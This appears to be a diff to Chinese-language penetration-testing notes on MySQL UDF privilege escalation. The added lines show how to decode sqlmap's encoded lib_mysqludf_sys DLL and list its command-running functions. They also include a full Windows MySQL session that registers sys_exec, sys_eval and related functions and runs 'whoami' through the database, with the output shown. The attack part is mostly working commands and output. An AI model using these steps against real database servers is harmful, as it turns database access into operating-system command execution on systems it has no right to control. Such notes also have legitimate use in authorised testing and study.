@@ -1304,6 +1304,14 @@ drwxr-xr-x 12 root     root   4096 Aug 13  2018 ..
 -- 两种方式的区别是否关联不同的攻击场景(日志痕迹、监控告警、是否返回大整数的更隐蔽等)，我暂时没有遇到过，
 -- 就暂时列出两种方式，不做推荐
 -- 第一种方式：返回字符串string的udf --
+-- kali上需要准备lib_mysqludf_sys.so
+-- sqlmap里的udf.dll是通过异或编码的，使用之前一定要记得解码，解码的工具也在sqlmap中
+-- python /sqlmap/extra/cloak/cloak.py -d -i /sqlmap/udf/mysql/windows/64/lib_mysqludf_sys.dll_
+-- 支持的函数
+-- sys_eval - executes an arbitrary command, and returns it's output.
+-- sys_exec - executes an arbitrary command, and returns it's exit code.
+-- sys_get - gets the value of an environment variable.
+-- sys_set - create an environment variable, or update the value of an existing environment variable.
 use mysql;
 show variables like '%plugin%';   --Look for the value of plugin_dir
 create table foo(line blob);       --line是列名    blob是数据类型Binary Large Object，用来存储二进制大数据类型
@@ -1382,6 +1390,45 @@ Hit me up on Twitter and let me know what you thought:
  
 
 ## 1.2. window
+
+<details>
+<summary>1. windows的UDF只写关键性步骤(不建议自己找dll文件，除非你自己能够验证该dll文件是好的，可以使用的)</summary>
+
+```sql
+-- kali: python /usr/share/sqlmap/extra/cloak/cloak.py -d -i /usr/share/sqlmap/data/udf/mysql/windows/64/lib_mysqludf_sys.dll_
+-- 上传到服务器
+mysql> use mysql
+Database changed
+mysql> select * from mysql.func;
+Empty set (0.00 sec)
+mysql> create function sys_exec returns integer soname 'lib_mysqludf_sys.dll';
+Query OK, 0 rows affected (0.00 sec)
+mysql> create function sys_get returns string soname 'lib_mysqludf_sys.dll';
+Query OK, 0 rows affected (0.00 sec)
+mysql> create function sys_set returns integer soname 'lib_mysqludf_sys.dll';
+Query OK, 0 rows affected (0.00 sec)
+mysql> select * from mysql.func;
++----------+-----+----------------------+----------+
+| name     | ret | dl                   | type     |
++----------+-----+----------------------+----------+
+| sys_eval |   0 | lib_mysqludf_sys.dll | function |
+| sys_exec |   2 | lib_mysqludf_sys.dll | function |
+| sys_get  |   0 | lib_mysqludf_sys.dll | function |
+| sys_set  |   2 | lib_mysqludf_sys.dll | function |
++----------+-----+----------------------+----------+
+4 rows in set (0.00 sec)
+mysql> select sys_eval('whoami');
++---------------------------------+
+| sys_eval('whoami')              |
++---------------------------------+
+| win-a8f2q4n694r\www.bcdaren.com |
++---------------------------------+
+1 row in set (0.03 sec)
+mysql> exit
+Bye
+```
+
+</details>
 
 # 2. 遗留
 还差一个windows版本的
